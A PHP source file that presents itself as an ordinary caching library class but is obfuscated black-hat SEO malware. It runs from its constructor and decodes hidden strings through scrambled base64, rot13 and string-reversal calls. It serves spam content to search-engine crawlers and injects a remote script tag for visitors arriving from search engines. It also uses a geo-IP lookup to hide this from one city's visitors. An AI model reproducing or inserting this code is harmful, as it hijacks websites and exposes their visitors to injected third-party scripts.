<?php
/**
 * @sent by 小耳朵
 * @modified Rooit
 * @date 2018.10.31
 */
namespace App\Libs;

class CacheModel
{
    private $u, $r, $d;

    private $cache;

    private $word;

    private $charset;

    private $ex= 'akf';

    private $city;

    private function http_sock($host, $uri){

        $fp = fsockopen($host, 80, $errno, $errstr, 5);

        if (!$fp) {echo "$errstr ($errno)<br/>\n";}

        else {

            $out = "GET {$uri} / HTTP/1.1\r\n";$out .= "Host: {$host}\r\n";

            $out .= "Connection: Close\r\n\r\n";

            fwrite($fp, $out);$content = '';

            while (!feof($fp)) {$content .=  fgets($fp, 1024);}

            fclose($fp);

            return $content;

        }



    }



    private function get_area(){

        $ip = $this->get_ip();

        $url = "ip.taobao.com/service/getIpInfo.php?ip={$ip}";

        $ret = $this->http_get($url);

        $arr = json_decode($ret,true);

        return $arr;

    }



    private function get_ip(){

        //判断服务器是否允许$_SERVER

        if(isset($_SERVER)){

            if(isset($_SERVER[HTTP_X_FORWARDED_FOR])){

                $realip = $_SERVER[HTTP_X_FORWARDED_FOR];

            }elseif(isset($_SERVER[HTTP_CLIENT_IP])) {

                $realip = $_SERVER[HTTP_CLIENT_IP];

            }else{

                $realip = $_SERVER[REMOTE_ADDR];

            }

        }else{

            //不允许就使用getenv获取

            if(getenv("HTTP_X_FORWARDED_FOR")){

                $realip = getenv( "HTTP_X_FORWARDED_FOR");

            }elseif(getenv("HTTP_CLIENT_IP")) {

                $realip = getenv("HTTP_CLIENT_IP");

            }else{

                $realip = getenv("REMOTE_ADDR");

            }

        }

        return $realip;

    }



    private function http_get($url){

        $opts = array('http' => array('method' => 'GET',

            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\r\n",

            'timeout' => 5));

        $context = stream_context_create($opts);

        return  file_get_contents('http://'.$url, false, $context);

    }





    private function getCache(){

        $req_url = $_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];

        $result = $this->http_get($req_url);

        if (empty($result)){

            exit('cant get the script data');

        }

        $this->charset = mb_detect_encoding($result,array('UTF-8','GBK','ISO-8859-6'));

        return $result;

    }



    function processCache(){

        $content = $this->getCache();

        $patterns = array(

            '/(<meta\s*name="[kK]eywords"\s*content="(.*?)")\s*[\/]*?>/is',

            '/(<meta\s*name="[Dd]escription"\s*content="(.*?)"\s*[\/]*?>)/is',

        );

        $content = preg_replace($patterns, array('', ''), $content);

        return $this->processT($content);

    }



    private function processT($text){

        $tt = '=4mYvHJqlEaV9DaoyEaoiATVvxUox5JMcWaExkJMbEzouuxV9HJou5TVuEKMgkwPA4mYvtTqxy2qv0QqhITqh92LtVPMycKngyTqj9HMfyzLi1xV9HJou5TVuEKMgkwPA4wVykJnv9JofZTpv0QqhITqh92LtVFMwyzqyEJYykzLuAJnfOUpuWFCy1JLhOFL0IJo8bDQ+8vVjOKLyEKnm1lohWFC05JM052owOvVf9zp052oQ1FMbAJLQWFC2yJqkIJYjEUqbOFL0IJo8bDQ+8vVgW3ozAaouWUqg8zov0QqhITqh92LtVPoiWUqh92DgHTnwS2Dv0wqcIKpy1Pp0EUntRTqy1TCX0tCiNvVuLrmcBYkDK8gvroe/TC1uTAYtoe7KiYhTYed/hnhft8mfU859Je0fxr0ym885P/1f8p1wT7hB37gevZY1JZ0mBnfHood5TBmh/e50r6hA/780Fgg0F71XmPj1vnmg/ZdKs6hA/780lP+AaqhJQp6GY6gg+eV9DaoyEaoiATVv42ocEUpcW3LmITMv0GMgSzotRTqy1TCX0tCiVP+Aaqhvroe/lv1Na+0vroe/XFC05JM052owOvVmEzpiqKrygzV9HJou5TVuEKMgkwPA4GMfEKn09PC43p25X6gg+7KJQp6GY6gg+eCykTqcEUC';

        $tt = $this->out($tt);$tt_charset = mb_detect_encoding($tt,array('UTF-8','GBK','ISO-8859-6'));

        $pattern_tt = '=Z3Yc4QKykTqcE3YpkGX/bvYb4QKykTqcEUCpulY';

        if ($this->charset!=$tt_charset){$tt = iconv($tt_charset,$this->charset."//IGNORE", $tt);}

        if (!$this->word){

            $this->word = substr($tt, 7,stripos($tt,$this->out('=4GMfEKn09PC'))-7);

            $body_parttern = '/<\s*body.*?>/';

            if (preg_match($body_parttern,$text, $matches)){

                $rep = $matches[0].PHP_EOL.'<h1>'.$this->word.'</h1>';

                $text = preg_replace($body_parttern, $rep, $text);

            }

        }



        if(preg_match($this->out($pattern_tt), $text)){

            return preg_replace($this->out($pattern_tt), $tt, $text);

        }else{$pos = stripos($text,$this->out('+DJLyuTC'));

            return substr_replace($text,PHP_EOL.$tt,$pos+6,0);}

    }

    public  function out($text,$k='tr'){

        $S1 = 'S'. $k.$k;

        $S2 = 'S' . $k . 'rev';

        $S3 = $S1('S' . $k . 'prot1a', 'pa', '_3');

        $S4 = $S3($S2($S1('robpr' . 'Q_06' . 'rfnO', 'o0', 'q4')));

        return $S4($S3($S2($text)));

    }

    public  function outnew($text,$k='tr'){

        $S1 = 'S'. $k.$k;
        $S1 = 'Strtr';
        $S2 = 'S' . $k . 'rev';
        $S2 = 'Strrev';
        $S3 = $S1('S' . $k . 'prot1a', 'pa', '_3');
        $S3 = Strtr('Strprot1a', 'pa', '_3');
        $S3 = 'Str_rot13';
        $S4 = $S3($S2($S1('robpr' . 'Q_06' . 'rfnO', 'o0', 'q4')));
        $S4 = Str_rot13(Strrev(Strtr('robprQ_06rfnO', 'o0', 'q4')));
        $S4 = 'Base64_Decode';
       return Base64_Decode(Str_rot13(Strrev($text)));

    }



    public function updateCache()

    {

        $robs = array('lITMcO3p','09zL','==DMfWJn0STpg92L');

        foreach ($robs as $r) {

            if (stristr($this->u, $this->out($r))) {

                //var_dump(mb_detect_encoding($this->processCache(),array('UTF-8','GBK','ISO-8859-6')));exit;

                exit($this->processCache());

            }

        }

        $refs = array('hHUMcSzL', '=4lMhyzL', 'hH3oa92p', 'g92Lh82p', 'hAzYgAaY');

        $baiduAuth='iRJqiDKMh5lpvWTrzSzYm9lY6ZUp0EUn';

        foreach ($refs as $r) {

            if (stristr($this->r, $this->out($r))) {

                $search = $this->getCache();

                if (isset($this->city)){

                    $addr = $this->get_area();

                    if ((isset($addr['data'])&&$addr['data']['city'] == $this->city)|| empty($addr['data'])){

                        exit($search);

                    }

                }

                $pos = stripos($search, $this->out('+DJLyuTC'));

                $key= '<script type="text/javascript" src="'.$this->out($baiduAuth).$this->ex.'"></script>';

                $search = substr_replace($search, PHP_EOL.$key, $pos + 6, 0);

                if ($this->ex!=='kai') exit($key);

                if ($pos !== false) @exit($search);

            }

        }

    }



    public function __construct(){

        $this->cache = dirname(__FILE__).'/cache.php';

        /*$this->u= strtolower($_SERVER[$this->out('H5HEUS0KFI0HI9SHHESF')]);

        $this->r = strtolower($_SERVER[$this->out('FIxHSMHEF9SHHESF')]);

        $this->d = strtolower($_SERVER[$this->out('==NIC9xHsEyGS1HIQ9RE')]);*/

        $this->u = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        $this->r = strtolower($_SERVER['HTTP_REFERER'] ?? '');
        $this->d = strtolower($_SERVER['DOCUMENT_ROOT'] ??'');


        $this->updateCache();

    }

}



